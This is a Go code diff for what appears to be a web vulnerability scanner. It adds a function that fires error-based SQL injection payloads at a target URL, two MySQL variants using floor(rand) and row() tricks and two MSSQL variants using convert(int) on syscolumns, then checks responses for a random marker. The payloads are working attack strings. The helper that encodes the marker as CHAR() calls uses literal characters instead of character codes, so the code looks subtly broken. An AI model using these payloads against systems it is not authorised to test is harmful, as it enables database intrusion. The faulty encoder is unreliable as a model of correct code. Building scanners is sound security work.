@@ -1,6 +1,8 @@
 package sql
 
 import (
+	"glint/pkg/layers"
+	"glint/util"
 	"regexp"
 
 	"github.com/thoas/go-funk"
@@ -103,9 +105,12 @@ var FalsePositivesPlainArray = []string{
 }
 
 type classSQLErrorMessages struct {
+	TargetUrl                string
 	plainArray               []string
 	regexArray               []string
 	FalsePositivesPlainArray []string
+	lastJob                  LastJob
+	layer                    *layers.Plreq
 }
 
 func (errsql *classSQLErrorMessages) IsFalsePositive(text string) bool {
@@ -150,7 +155,81 @@ func (errsql *classSQLErrorMessages) searchOnText(text string) string {
 	return result
 }
 
-func (errsql *classSQLErrorMessages) testInjection(index int, value string, confirmData []string) bool {
+func encodeStringAsChar(str string, separator string) string {
+	var out = ""
+	for _, v := range []rune(str) {
+		out = out + `CHAR(` + string(v) + `)` + separator
+	}
+	if out != "" {
+		// remove the last +
+		out = out[:len(out)-1]
+	}
+	return out
+}
 
-	return true
+func (errsql *classSQLErrorMessages) TestInjection(index int, value string, confirmData []string) bool {
+
+	matchedText := errsql.searchOnText(errsql.lastJob.Features.Response.String())
+	if matchedText != "" {
+		for _, data := range confirmData {
+			markerPlain := util.RandStr(8)
+			markerEncodedMSSQL := encodeStringAsChar(markerPlain, `+`)
+			markerEncodedMYSQL := encodeStringAsChar(markerPlain, `,`)
+			// msyql variant 1
+			confirmValue := data +
+				`and(select 1 from(select count(*),concat((select concat(` +
+				markerEncodedMYSQL +
+				`) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and` +
+				data
+			body_Feature, err := errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			if err != nil {
+				return false
+			}
+			if funk.Contains(body_Feature.Response.String(), markerPlain) {
+				return true
+			}
+
+			// msyql variant 2
+			confirmValue = data +
+				`(select 1 and row(1,1)>(select count(*),concat(concat(` +
+				markerEncodedMYSQL +
+				`),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))` +
+				data
+			body_Feature, err = errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			if err != nil {
+				return false
+			}
+			if funk.Contains(body_Feature.Response.String(), markerPlain) {
+				return true
+			}
+			// mssql variant 1
+			if data != "" {
+				confirmValue = data + `+(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)+` + data
+			} else {
+				confirmValue = data + `(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)` + data
+			}
+			body_Feature, err = errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			if err != nil {
+				return false
+			}
+			if funk.Contains(body_Feature.Response.String(), markerPlain) {
+				return true
+			}
+			// mssql variant 2
+			if data != "" {
+				confirmValue = data + `+convert(int,` + markerEncodedMSSQL + `)+` + data
+			} else {
+				confirmValue = data + `convert(int,` + markerEncodedMSSQL + `)` + data
+			}
+			body_Feature, err = errsql.layer.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			if err != nil {
+				return false
+			}
+			if funk.Contains(body_Feature.Response.String(), markerPlain) {
+				return true
+			}
+		}
+		return false
+	}
+	return false
 }
